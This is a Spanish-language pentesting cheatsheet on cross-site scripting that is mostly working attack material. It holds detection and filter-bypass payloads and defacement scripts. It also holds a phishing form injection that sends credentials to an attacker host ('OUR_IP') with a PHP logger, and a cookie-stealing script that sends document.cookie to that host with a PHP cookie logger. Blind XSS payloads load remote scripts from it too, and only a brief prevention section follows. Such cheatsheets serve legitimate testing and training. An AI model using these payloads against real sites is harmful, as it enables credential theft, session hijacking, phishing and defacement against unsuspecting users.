---
title: "Cross-Site Scripting (XSS)"
description: "Reflected, stored, DOM XSS, payloads y bypass de filtros."
sidebar:
  order: 5
  label: "Cross-Site Scripting (XSS)"
---
> XSS inyecta JavaScript en el cliente via input no sanitizado. Tipos: Stored (persistente), Reflected (no persistente vía URL), DOM-based (solo client-side). Impacto: robo de sesión, phishing, defacing.

---


## Tipos de XSS

| Tipo | Persistente | Dónde | Cómo atacar |
|------|-------------|-------|-------------|
| **Stored** | ✅ Sí | BD → todos los usuarios | Inyectar en formulario/comentario → payload visible para cualquier visitante |
| **Reflected** | ❌ No | Back-end → respuesta inmediata | Enviar URL con payload al target |
| **DOM-based** | ❌ No | Solo client-side JS | URL con `#` o parámetro leído por JS vulnerable (`innerHTML`, `document.write`) |

---

## Payloads de detección

```html
<!-- Básico — funciona en la mayoría de contextos -->
<script>alert(window.origin)</script>
<script>alert(1)</script>
<script>print()</script>

<!-- Sin <script> — para innerHTML y DOM XSS -->
<img src="" onerror=alert(window.origin)>
<img src=x onerror=alert(1)>

<!-- Verificación visual sin JS -->
<plaintext>

<!-- Alternativas con event handlers -->
<body onload=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onchange=alert(1)><option>1</option></select>
<video src=x onerror=alert(1)>

<!-- Break out de atributo -->
'><script>alert(1)</script>
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
```

> **Tip:** `window.origin` muestra la URL del iframe/dominio que ejecuta el payload — útil para confirmar en qué contexto se ejecutó.

---

## DOM XSS — Sources y Sinks

### Sources (input al DOM)

```javascript
document.URL
document.location
document.referrer
location.hash          // fragmento #... de la URL
window.name
// + cualquier input field leído con .value
```

### Sinks peligrosos (escriben HTML sin sanitizar)

```javascript
// JavaScript nativo
element.innerHTML = userInput    // NO permite <script> pero sí <img onerror=>
element.outerHTML = userInput
document.write(userInput)
document.writeln(userInput)

// jQuery
$('#el').html(userInput)
$('#el').append(userInput)
$('#el').after(userInput)
$('#el').before(userInput)
$('#el').prepend(userInput)
$('#el').replaceWith(userInput)
```

> **Regla:** si `innerHTML` recibe input del usuario → usar `<img onerror=...>` en vez de `<script>`, porque innerHTML bloquea `<script>`.

---

## Defacing (Stored XSS)

```javascript
// Cambiar fondo de pantalla
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://evil.com/bg.jpg"</script>

// Cambiar título de la página
<script>document.title = 'Hacked'</script>

// Reemplazar todo el contenido del body
<script>document.getElementsByTagName('body')[0].innerHTML = '<h1>Hacked</h1>'</script>

// Con jQuery (si está disponible)
<script>$('body').html('<center><h1>Hacked</h1></center>')</script>
```

---

## Phishing — Login Form Injection (Reflected XSS)

### Paso 1 — Inyectar formulario falso

```javascript
// Payload completo: escribir form + eliminar el form legítimo + comentar el resto
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
document.getElementById('urlform').remove();
// Añadir <!-- al final de la URL para comentar HTML residual
```

### URL de ataque (Reflected)

```
http://target/page?param='><script>PAYLOAD</script><!--
```

### Paso 2 — Capturar credenciales (netcat rápido)

```bash
sudo nc -lvnp 80
# GET /?username=admin&password=pass123 HTTP/1.1
```

### Paso 3 — PHP server para redirect silencioso (más creíble)

```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver
```

```php
<?php
// index.php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://TARGET_IP/original_page.php");
    fclose($file);
    exit();
}
?>
```

```bash
sudo php -S 0.0.0.0:80
cat creds.txt    # ver credenciales capturadas
```

---

## Session Hijacking — Cookie Stealing

### Script en OUR_IP — script.js

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

### PHP cookie logger — index.php

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

### Payload XSS para cargar el script

```bash
# Iniciar server PHP
mkdir /tmp/tmpserver && cd /tmp/tmpserver
# crear script.js e index.php
sudo php -S 0.0.0.0:80
```

```html
<!-- Payload en el campo vulnerable -->
<script src=http://OUR_IP/script.js></script>
```

```bash
# Verificar cookies capturadas
cat cookies.txt
# Victim IP: 10.10.10.1 | Cookie: session=f904f93c949d19d870911bf8b05fe7b2
```

### Usar cookie robada en Firefox

```
Shift+F9 → Storage → + → añadir Name=session, Value=f904f93c...
→ Refresh → acceso como víctima
```

---

## Blind XSS — Detectar campo vulnerable

```html
<!-- Identificar qué campo ejecuta XSS (sin ver la respuesta directamente) -->
<script src=http://OUR_IP/fullname></script>
<script src=http://OUR_IP/username></script>
<script src=http://OUR_IP/email></script>
<script src=http://OUR_IP/website></script>

<!-- Variaciones para distintos contextos de inyección -->
'><script src=http://OUR_IP/field></script>
"><script src=http://OUR_IP/field></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>$.getScript("http://OUR_IP/field")</script>
```

```bash
# Servidor escuchando — ver qué campo hace callback
sudo php -S 0.0.0.0:80
# 10.10.10.1 [200]: /username → username es el campo vulnerable
```

> **Campos a priorizar:** name, username, website — skip email (validada) y password (hasheada).

---

## Herramientas automatizadas

```bash
# XSStrike — fuzzer de XSS
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike && pip install -r requirements.txt
python xsstrike.py -u "http://target/page?param=test"

# Burp Pro Scanner / ZAP Active Scan → también detectan XSS automáticamente
# Ver cheatsheet [Using Web Proxies](/metodologias/web/using-web-proxies/) para configuración

# Wordlists de payloads manuales
# https://github.com/swisskyrepo/PayloadsAllTheThings (XSS Injection)
# https://github.com/payload-box/xss-payload-list
```

---

## Prevención (para reporte / hardening)

```javascript
// Frontend — sanitizar con DOMPurify
import DOMPurify from 'dompurify';
let clean = DOMPurify.sanitize(userInput);

// Evitar sinks peligrosos con input de usuario:
// ❌ element.innerHTML = userInput
// ✅ element.textContent = userInput
```

```php
// Backend PHP — output encoding
htmlentities($_GET['input']);      // encode todas las entidades HTML
htmlspecialchars($_GET['input']); // encode < > " ' &

// Backend PHP — validación
filter_var($_GET['email'], FILTER_VALIDATE_EMAIL);
```

---

## Pitfalls / Gotchas

- **`innerHTML` bloquea `<script>`** → usar `<img onerror=...>` o `<svg onload=...>` en contextos DOM.
- **Reflected XSS via GET** → la URL completa con payload se puede compartir. Verificar si el parámetro va en GET o POST antes de craftar el ataque.
- **`#` en DOM XSS** → el fragmento de URL (`#`) nunca llega al servidor. Si ves `#task=FUZZ` en la URL, es DOM XSS.
- **Blind XSS sin callback** → si ningún payload llama al server, probar variantes con `'><script src=...>` o `"><script src=...>` para salir del contexto de atributo.
- **PHP server vs netcat** → netcat captura una sola conexión y no devuelve respuesta HTTP. Usar PHP para multi-víctima y redirect silencioso.
- **Cookie HttpOnly** → si la cookie tiene `HttpOnly`, `document.cookie` devuelve vacío. Session hijacking no funciona directamente; considerar keylogging o robo de token CSRF.
- **CSP activo** → Content Security Policy puede bloquear `<script src=http://...>` externo. Verificar headers de respuesta. Necesitar payload inline si CSP lo permite.
- **iframe con dominio distinto** → `window.origin` mostrará el dominio del iframe, no del parent. Confirmar cuál es el dominio vulnerable.
- **`alert()` bloqueado** → algunos browsers modernos bloquean alert en iframes cross-origin. Usar `print()` o `confirm()` como alternativa.
- **XSStrike falsos positivos** → siempre verificar manualmente el payload que reporta la herramienta.

---

## Cheatsheets relacionados

- [Using Web Proxies](/metodologias/web/using-web-proxies/) — interceptar peticiones para craftar y probar payloads XSS
- [File Inclusion](/metodologias/web/file-inclusion/) — XSS stored puede usarse para extraer tokens de páginas LFI
- [Web Attacks](/metodologias/web/web-attacks/) — CSRF, session management, JWT — complementa session hijacking
- [Attacking Common Applications](/metodologias/web/attacking-common-applications/) — XSS en CMS (WordPress, Joomla) y paneles de admin
